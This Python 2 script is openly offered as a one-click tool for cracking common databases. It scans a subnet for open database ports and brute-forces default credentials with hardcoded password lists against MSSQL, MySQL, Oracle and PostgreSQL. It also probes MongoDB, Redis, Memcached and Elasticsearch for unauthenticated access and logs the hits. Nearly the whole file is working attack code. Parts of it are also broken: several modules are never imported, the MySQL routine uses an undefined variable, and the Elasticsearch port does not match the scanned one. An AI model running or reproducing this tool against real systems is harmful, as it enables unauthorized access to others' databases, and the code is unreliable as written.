# /bin/env python
# -*- coding=utf-8 -*-

# 一款一键破解所有常见数据库的工具
# auther: d3ckx1
# time: 2021/04

import socket
import pymssql
import pymysql
import sys
import time
from IPy import IP
from colorama import Fore
import threading

banner = '''

 ██████╗██████╗  █████╗  ██████╗██╗  ██╗      █████╗ ██╗     ██╗     ██████╗ ██████╗ ███████╗
██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝     ██╔══██╗██║     ██║     ██╔══██╗██╔══██╗██╔════╝
██║     ██████╔╝███████║██║     █████╔╝█████╗███████║██║     ██║     ██║  ██║██████╔╝███████╗
██║     ██╔══██╗██╔══██║██║     ██╔═██╗╚════╝██╔══██║██║     ██║     ██║  ██║██╔══██╗╚════██║
╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗     ██║  ██║███████╗███████╗██████╔╝██████╔╝███████║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝╚═════╝ ╚═════╝ ╚══════╝
                                                                                             
                                                                                                              
 			            v1.0   code by d3ckx1

 		            你多学一样本事，就少说一句求人的话

'''
print banner



#各数据库端口：mysql=3306, sqlserver=1433, oracle=1521, PostgreSQL=5432, MongoDB=27017, Redis=6379, memcached=11211, Elasticsearch=9300
portlists = ['1433', '3306', '6379', '1521', '5432', '27017', '11211', '9300',]

def findservers(ip):
    for i in portlists:
        try:
            sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(0.5)
            tcpscan = (str(ip), int(i))
            sock.connect(tcpscan)

            print Fore.RED + " [+] IP: " + str(ip) + " TCP: " + str(i) + " is open! [+] "
            ok = open("serveropen.txt", 'a+')
            ok.write(str(ip) + ':'+str(i))
            ok.write("\n")
            ok.close()

            if str(i) == "1433":
                pwnmssql(ip)

            elif str(i) == "3306":
                pwnmysql(ip)

            elif str(i) == "1521":
                pwnoracle(ip)

            elif str(i) == '5432':
                pwnpostsql(ip)

            elif str(i) == "27017":
                pwnmongo(ip)


            elif str(i) == "6379":
                pwnredis(ip)

            elif str(i) == "11211":
                pwnmemcach(ip)

            elif str(i) == "9300":
                pwnelasticsearch(ip)

            else:
                pass


        except:
            pass




def pwnmssql(ip):
    print Fore.GREEN + "~~~~~ [*] Start it MSSQL servers cracked work! [*] ~~~~~"

    passwd = ["sa", 'sa123', 'sa123456', 'sa@123', 'sa@123456', '123456', '12345678', '111111', 'Passw0rd', 'qweasdzxc', 'sa123', 'password', '12345', '1234', '123', 'qwerty', 'test', 'test@123','admin@123', 'mssql','leadsec@7766',]

    host = str(ip)
    port = 1433
    success = False

    for password in passwd:
        try:
            db = pymssql.connect(server=host, port=port, user="sa", password=password)
            success = True
            if success:
                print "[+] MSSQL Cracked successfully username:sa" + " password:" + password + " [+]"

        except Exception, e:
            pass

    print Fore.YELLOW + " [-] Sorry，MSSQL was not crack it [-] "

def pwnmysql(ip):
    print Fore.GREEN + "~~~~~ [*] Start it Mysql servers cracked work! [*] ~~~~~"
    passwds = ['changme', 'root', 'toor', 'root@123', 'rootroot', 'root123', 'toor@123', '123456', '12345678', '111111', 'Passw0rd', 'qweasdzxc', 'admin123', 'admin888', 'administrator', 'administrator123', 'password', '12345', '1234', '123', 'qwerty','test', '1q2w3e4r', '1qaz2wsx', 'qazwsx', '123qwe', '123qaz', '0000', '1234567', '123456qwerty', 'password123', '1q2w3e', 'abc123', 'test123', '123456789', 'q1w2e3r4', 'sqlpass', 'sql123', 'sqlserver', 'iloveyou', '000000', '654321', 'passw0rd1', 'superman', '112233', 'zxcvbnm','fuckyou', 'abcd1234','woaini520', 'woaini1314', '5201314', 'admin!@', 'pass', 'p@$$w0rd', '888888', '666666','', 'mysql', 'r00t', 'p@55w0rd',]

    for passs in passwds:
        try:
            con = pymysql.connect(str(ip), "root", passs)

            print Fore.RED + "[+] MYSQL Cracked successfully username:" + user + " password:" + passs + " [+]"
            con.close()
            break

        except :
            pass

    print Fore.YELLOW + " [-] Sorry，MYSQL was not crack it [-] "



def pwnoracle(ip):
    print Fore.GREEN + "~~~~~ [*] Start it Orace servers cracked work! [*] ~~~~~"
    users = ["sys" , "internal", "system", "scott",]
    passwds = ['changme', 'root', 'manager', 'root@123', 'rootroot', 'root123', 'tiger', '123456', '12345678', '111111',
               'Passw0rd', 'qweasdzxc', 'admin123', 'admin888', 'password','12345', '1234', '123', 'qwerty', '1q2w3e4r', '1qaz2wsx', 'qazwsx', '123qwe', '123qaz', '0000',
               '1234567', '123456qwerty', 'password123', '1q2w3e', 'abc123', 'test123', '123456789', 'q1w2e3r4','sqlpass', 'sql123', 'sqlserver', 'iloveyou', '000000', '654321', 'passw0rd1', 'superman', '112233',
               'zxcvbnm', 'oracle', 'abcd1234', 'woaini520', 'woaini1314', '5201314', 'admin!@', 'pass', 'p@$$w0rd','888888', '666666', '', 'change_on_install', 'r00t', 'p@55w0rd', ]
    for user in users:
        for passs in passwds:
            try:
                conn = cx_Oracle.connect(
                    user + '/' + passs + '@' + str(ip) + ':1521'  + '/' + 'orcl')

                print Fore.RED + "[+] Oracle Cracked successfully username:" + user + " password:" + passs + " [+]"

                conn.close()
                break
            except Exception as e:
                pass

    print Fore.YELLOW + " [-] Sorry，Oracle was not crack it [-] "




def pwnpostsql(ip):
    print Fore.GREEN + "~~~~~ [*] Start it PostgreSQL servers cracked work! [*] ~~~~~"
    users = ["postgres", "msf",] #添加了msf的默认账户
    passwds = ['changme', 'root', 'manager', 'root@123', 'rootroot', 'root123', 'tiger', '123456', '12345678', '111111',
               'Passw0rd', 'qweasdzxc', 'admin123', 'admin888', 'password','12345', '1234', '123', 'qwerty', '1q2w3e4r', '1qaz2wsx', 'qazwsx', '123qwe', '123qaz', '0000',
               '1234567', '123456qwerty', 'password123', '1q2w3e', 'abc123', 'test123', '123456789', 'q1w2e3r4','sqlpass', 'sql123', 'msfpass', 'adminPass', 'iloveyou', '000000', '654321', 'passw0rd1', 'superman', '112233',
               'zxcvbnm', 'postsql', 'abcd1234', 'woaini520', 'woaini1314', '5201314', 'admin!@', 'pass', 'p@$$w0rd','888888', '666666', '', 'postgres', 'r00t', 'p@55w0rd', ]
    for user in users:
        for passs in passwds:
            try:
                conn = psycopg2.connect(host=str(ip), port=5432, user=user, password=passs)
                print Fore.RED + "[+] PostSQL Cracked successfully username:" + user + " password:" + passs + " [+]"
                conn.close()
                break
            except Exception as e:
                pass

    print Fore.YELLOW + " [-] Sorry，PostgreSQL was not crack it [-] "




def pwnmongo(ip):
    print Fore.GREEN + "~~~~~ [*] Start it MongoDB servers cracked work! [*] ~~~~~"

    try:
        conn = pymongo.MongoClient(str(ip), 27017)
        dbname = conn.database_names()
        print Fore.RED + "[+] " + str(ip) + ":27017  存在MongoDB存在未授权访问 [+]"
    except Exception as e:
        pass
    finally:
        conn.close()

    print Fore.YELLOW + " [-] Sorry，MongoDB was not crack it [-] "




def pwnredis(ip):
    print Fore.GREEN + "~~~~~ [*] Start it Redis servers cracked work! [*] ~~~~~"
    passwds = ['123456', '12345678', '111111','Passw0rd', 'qweasdzxc', 'admin123', 'admin888', 'password', '12345', '1234', '123', 'qwerty','1q2w3e4r', '1qaz2wsx', 'qazwsx', '123qwe', '123qaz', '0000', \
               '1234567', '123456qwerty', 'password123', '1q2w3e', 'abc123', 'test123', '123456789', 'q1w2e3r4', 'adminPass', 'iloveyou', '000000', '654321', 'passw0rd1', 'superman', '112233', \
               'zxcvbnm', 'abcd1234', 'woaini520', 'woaini1314', '5201314', 'admin!@', 'pass', 'p@$$w0rd', '888888', '666666', '', 'r00t', 'p@55w0rd', ]

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(ip), 6379))
        s.send('INFO\r\n')
        if 'redis_version' in s.recv(1024):
            print Fore.RED + "[+] " + str(ip) + ":6379  存在Redis存在未授权访问 [+]"

        else:
            for passs in passwds:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((str(ip), 6379))
                    s.send('AUTH {}\r\n'.format(passs))
                    if '+OK' in s.recv(1024):
                        print Fore.RED + "[+] Redis Cracked successfully " + "password:" + passs + " [+]"
                        break
                except Exception as e:
                    pass
                finally:
                    s.close()
    except Exception as e:
        pass

    print Fore.YELLOW + " [-] Sorry，Redis was not crack it [-] "




def pwnmemcach(ip):
    print Fore.GREEN + "~~~~~ [*] Start it Memcached servers cracked work! [*] ~~~~~"

    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((str(ip), 11211))
        s.send('stats\r\n')
        if 'version' in s.recv(1024):
            print Fore.RED + "[+] " + str(ip) + ":11211  存在Memcached存在未授权访问 [+]"
            s.close()
    except Exception as e:
        pass

    print Fore.YELLOW + " [-] Sorry，Memcached was not crack it [-] "


def pwnelasticsearch(ip):
    print Fore.GREEN + "~~~~~ [*] Start it Elasticsearch servers cracked work! [*] ~~~~~"

    try:
        url = 'http://' + str(ip) + ':9200/_cat'
        r = requests.get(url, timeout=5)
        if '/_cat/master' in r.content:
            print Fore.RED + "[+] " + str(ip) + ":9200  存在Elasticsearch存在未授权访问 [+]"

    except Exception as e:
        pass

    print Fore.YELLOW + " [-] Sorry，Elasticsearch was not crack it [-] "




if __name__ == '__main__':

    if len(sys.argv) == 1 or sys.argv[1] == '-h':
        print "Usage : python crack-allDBs.py 192.168.1.1/24"

    else:
        localtime = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime())
        print "The Scanning time is: ", localtime
        print '-'*88
        print Fore.GREEN + "~~~~~ [*] Start it DB's servers open work! [*] ~~~~~"
        print "~~~~~ [*] please wait a moment... [*] ~~~~~"
        ips = IP(sys.argv[1], make_net=1)   #接收传入的IP地址,加入'make_net'防止出错
        for ip in ips:
            t1 = threading.Thread(target=findservers(ip),args=(10,15))
            t1.setDaemon(True)
            t1.start()

        print Fore.WHITE + "-" * 88
        print " [*] Report Boss Scan complete！[*] "

